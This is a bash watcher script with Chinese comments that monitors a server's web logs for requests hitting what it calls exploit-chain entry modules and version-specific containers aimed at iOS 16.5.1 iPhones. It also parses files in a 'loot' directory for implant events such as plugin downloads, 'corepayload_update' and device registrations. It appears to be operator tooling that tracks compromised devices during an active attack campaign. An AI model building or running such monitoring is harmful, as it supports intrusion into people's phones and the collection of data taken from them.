#!/bin/bash
# 盯 16.5.1 云真机（ip11p）+ 16.1 重投：抓链入口 / 16.5.1 档容器 / UA / plugin_* 事件
LOG=/www/wwwlogs/i.131422.com.log
NLOG=/www/wwwlogs/i.131422.com.node.log
L=/www/wwwroot/i.131422.com/loot
SEEN=/tmp/hg_w2_seen.txt
HIT=/tmp/hg_w2_hit
: > "$SEEN"; rm -f "$HIT"
END=$(( $(date +%s) + 2400 ))
echo "[$(date -u +%T)] watcher2 start (40min cap)"

# 已知设备 IP（避免重复报）
KNOWN="182.239.92.215|112.47.135.113|117.188.116.13|117.188.116.14|222.92.47.194|112.91.192.4|58.240.238.70|103.234.68.110|117.188.112.160|117.188.29.119|117.188.113.29|185.255.127.35|185.255.127.18|185.255.127.193|127.0.0.1|202.146.222.253"

while [ "$(date +%s)" -lt "$END" ]; do
  # 1) 16.5.1 / 17.x 档容器 + gooll 链入口模块
  tail -3000 "$LOG" | grep -a "10/Sep/2026:0[6-9]\|10/Sep/2026:1[0-9]:" \
    | grep -a "226cbd84\|81b403cc\|377bed74\|4817ea80\|49554fde7424c31c.js\|7a1cef00016b950" \
    | grep -av "^127.0.0.1" | awk '{print $1,$4,$7,$9,$10}' | sed 's/\[//' > /tmp/hg_w2_chain.txt
  # 2) 任何 iPhone OS 16_5_1 的请求
  tail -3000 "$LOG" | grep -a "16_5_1 like" | awk '{print $1,$4,$7,$9,$10}' | sed 's/\[//' > /tmp/hg_w2_ua.txt
  # 3) 新 IP 的 gooll 链（不在已知表里的）
  tail -3000 "$LOG" | grep -a "gooll/" | grep -avE "^($KNOWN) " | awk '{print $1}' | sort -u > /tmp/hg_w2_newip.txt
  # 4) node.log 的 ip-sync（设备注册/版本上报）
  grep -a "CorunaLoot:ip-sync" "$NLOG" 2>/dev/null | tail -6 | cut -c1-260 > /tmp/hg_w2_ips.txt
  # 5) loot 新 plugin_* 事件
  SINCE="$(date -u -d '-90 seconds' '+%Y-%m-%d %H:%M:%S')"
  find "$L" -name '*.json' ! -name '*.meta.json' -newermt "$SINCE" 2>/dev/null > /tmp/hg_w2_loot.txt
  while IFS= read -r f; do
    grep -q 'plugin_batch_done\|plugin_download_ok\|plugin_download_failed\|plugin_verify_failed\|config_download_failed\|corepayload_update' "$f" 2>/dev/null || continue
    grep -qF "$f" "$SEEN" 2>/dev/null && continue
    echo "$f" >> "$SEEN"
    python3 - "$f" <<'PY'
import json, sys, datetime
try: d = json.load(open(sys.argv[1]))
except Exception: sys.exit()
print('[%s] LOOT %-22s dev=%-12s os=%-7s total=%s entries=%s ok=%s sb=%s bundle=%-24s reason=%s' % (
    datetime.datetime.utcnow().strftime('%H:%M:%S'), d.get('et'), str(d.get('device')), str(d.get('pv')),
    str(d.get('total')), str(d.get('entries')), str(d.get('ok')), str(d.get('springboard')),
    str(d.get('bundleId'))[:24], d.get('reason')))
PY
    echo hit >> "$HIT"
  done < /tmp/hg_w2_loot.txt

  if [ -s /tmp/hg_w2_newip.txt ] || [ -s /tmp/hg_w2_ua.txt ]; then
    echo "[$(date -u +%T)] 命中新的 gooll 链 IP 或 16_5_1 UA" ; echo hit >> "$HIT"
  fi
  if grep -q "226cbd84\|81b403cc" /tmp/hg_w2_chain.txt 2>/dev/null; then
    echo "[$(date -u +%T)] 命中 16.5.1 档容器" ; echo hit >> "$HIT"
  fi
  [ -s "$HIT" ] && { echo "[$(date -u +%T)] 命中，退出"; break; }
  sleep 20
done

echo "=== watcher2 结束 $(date -u +%T) ==="
echo "--- 16.5.1 档容器/gooll 入口请求 ---"; cat /tmp/hg_w2_chain.txt 2>/dev/null | tail -20
echo "--- 16_5_1 UA 请求 ---"; cat /tmp/hg_w2_ua.txt 2>/dev/null | tail -10
echo "--- 非已知 IP ---"; cat /tmp/hg_w2_newip.txt 2>/dev/null
echo "--- 最新 ip-sync ---"; cat /tmp/hg_w2_ips.txt 2>/dev/null
echo "--- plugin_* 事件 ---"; while IFS= read -r f; do basename "$f"; done < "$SEEN"
echo "--- 最新 post_t ---"; ls -t "$L"/unknown_posts/post_t_*.bin 2>/dev/null | head -3 | while read -r x; do basename "$x"; done
